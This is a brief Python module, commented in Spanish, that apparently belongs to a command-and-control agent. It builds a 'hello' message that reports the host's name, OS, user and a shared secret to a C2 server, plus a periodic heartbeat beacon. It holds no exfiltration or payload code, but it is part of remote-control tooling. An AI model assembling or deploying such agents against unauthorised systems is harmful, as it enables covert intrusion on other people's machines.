"""Identidad del agente: mensajes `hello` y `heartbeat` del protocolo C2."""
from __future__ import annotations

import getpass
import platform
import socket
import time

from config import VERSION


def build_hello(agent_id: str, secret: str = "") -> dict:
    """Construye el mensaje de identificación enviado al conectar.

    Compatible con el contrato documentado en docs/protocolo.md del
    servidor C2 (campos type, agent_id, hostname, os, user, version, secret).
    """
    return {
        "type": "hello",
        "agent_id": agent_id,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": getpass.getuser(),
        "version": VERSION,
        "secret": secret,
    }


def build_heartbeat() -> dict:
    """Construye la señal de actividad periódica."""
    return {
        "type": "heartbeat",
        "ts": time.time(),
    }
